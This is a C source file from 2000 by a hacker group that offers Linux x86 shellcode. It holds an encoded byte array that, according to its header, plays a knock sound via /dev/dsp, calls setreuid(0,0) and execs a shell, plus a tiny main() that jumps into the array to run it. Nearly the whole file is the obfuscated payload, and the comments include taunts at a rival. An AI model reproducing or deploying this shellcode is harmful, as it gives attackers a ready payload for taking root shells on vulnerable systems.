/*
  * Audio (knock knock knock) via /dev/dsp + setreuid(0,0) + execve shellcode. 
(Linux x86)
  * Author: Cody Tubbs (loophole of hhp).
  * www.hhp-programming.net / pigspigs@yahoo.com
  * 12/20/2000.
  *
  * F.U. to ph1x(ry4n). -From me and dxmd...
  * [If I ripped this, show me the source... or better yet
  *  go barrow a shovel so you can dig up deeper shit.]
  */

unsigned char hhpcode[] =
"\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc6\x0f\x31\xc9\x66"
"\xb9\x1c\x02\x80\x36\x03\x46\xe2\xfa\xea\xb8\x03\x03\x03\x2c\x61"
"\x6a\x6d\x2c\x70\x6b\x03\x7d\x03\x93\x93\x93\x93\x93\x93\x93\x93"
"\x93\x93\x93\x93\x93\x93\x93\x93\x93\x7f\x79\x75\x76\x76\x77\x72"
"\x6e\x69\x68\x6d\x70\x76\x76\x72\x6e\x69\x64\x65\x60\x63\x5e\x58"
"\x58\x5e\x5d\x5d\x5e\x5c\x61\x64\x6e\x70\x78\xa5\xaf\xb1\xb5\xbf"
"\xbc\xc0\xc6\xc6\xc1\xc2\xbd\xbe\xb9\xbb\xb6\xac\xaa\xa0\x6d\x6f"
"\x66\x6a\x69\x64\x55\x26\x33\x4d\x54\x5d\x43\x38\x35\x46\x40\x63"
"\x60\x61\x55\x48\x49\x4d\x5d\x66\x6e\x6a\x64\x63\x59\x54\x63\x69"
"\x6f\x70\x7a\x7b\x77\x7b\x79\x75\x71\x6d\x72\x72\x70\x71\x72\x6d"
"\x72\x70\x70\x70\x79\x76\x6c\x6d\x6f\x6e\x68\x70\x75\x6e\x65\x65"
"\x69\x68\x72\x75\x7d\x7f\x7e\x7d\x7f\x79\x78\x78\x7e\x79\x7e\x7d"
"\x7f\x74\x75\x77\x70\x75\x79\x7f\x78\x7a\x75\x71\x73\x72\x09\x03"
"\x2c\x67\x66\x75\x2c\x67\x70\x73\x03\x82\xef\x64\x28\x03\x03\x8a"
"\xf5\x56\x8a\xe6\x80\xef\x1f\x54\x55\x50\xeb\x03\x03\x03\x03\x58"
"\x82\xc0\xb9\x12\x03\x03\xc4\x46\xfb\x03\x03\x03\x03\xc4\x46\xff"
"\x03\x03\x03\x03\x8e\x80\x76\xee\xfc\xfc\x8a\x46\xfb\x8e\xb8\x7e"
"\xee\xfc\xfc\x8e\x90\x93\xee\xfc\xfc\x8a\x56\xeb\x8e\x88\x24\xed"
"\xfc\xfc\x8a\xcd\xbb\x06\x03\x03\x03\xba\x02\x03\x03\x03\xb9\x83"
"\x02\x03\x03\x50\x8a\xf0\xce\x83\x8a\x46\xf7\xbb\x2a\x03\x03\x03"
"\x88\x76\xf7\x50\x8a\xf0\xce\x83\x8a\x46\xe7\xbb\x07\x03\x03\x03"
"\x88\x76\xe7\x88\x4e\xeb\xb9\x95\x03\x03\x03\x50\x8a\xf0\xce\x83"
"\xbb\x07\x03\x03\x03\x50\x8a\xf0\xce\x83\xc4\x46\xf3\x03\x03\x03"
"\x03\xbb\x07\x03\x03\x03\x88\x76\xe7\x8a\xfa\xb9\x02\x03\x03\x03"
"\x50\x8a\xf0\xce\x83\xfc\x46\xf3\x82\x7e\xf3\x54\x01\x03\x03\x7d"
"\xe3\xbb\x07\x03\x03\x03\x88\x4e\xeb\xb9\x95\x03\x03\x03\x50\x8a"
"\xf0\xce\x83\xbb\x07\x03\x03\x03\x50\x8a\xf0\xce\x83\xc4\x46\xf3"
"\x03\x03\x03\x03\x93\xbb\x07\x03\x03\x03\x88\x76\xe7\x8a\xfa\xb9"
"\x02\x03\x03\x03\x50\x8a\xf0\xce\x83\xfc\x46\xf3\x82\x7e\xf3\x54"
"\x01\x03\x03\x7d\xe3\xbb\x07\x03\x03\x03\x88\x4e\xeb\xb9\x95\x03"
"\x03\x03\x50\x8a\xf0\xce\x83\xbb\x07\x03\x03\x03\x50\x8a\xf0\xce"
"\x83\xbb\x05\x03\x03\x03\x50\x8a\xf0\xce\x83\xbb\x05\x03\x03\x03"
"\x88\x76\xf7\x50\x8a\xf0\xce\x83\xbb\x45\x03\x03\x03\x32\xf5\x32"
"\xca\x50\x8a\xf0\xce\x83\x8e\x7e\xfb\xbb\x08\x03\x03\x03\x88\x76"
"\xfb\x8a\xfa\x32\xd1\x50\x8a\xf0\xce\x83\x32\xc3\x8e\x66\xdb\x58"
"\x5d\x5c\xca\xc0\x93\x69";

typedef void (*F)(); 
main(){F a;a=(F)(&hhpcode);a();}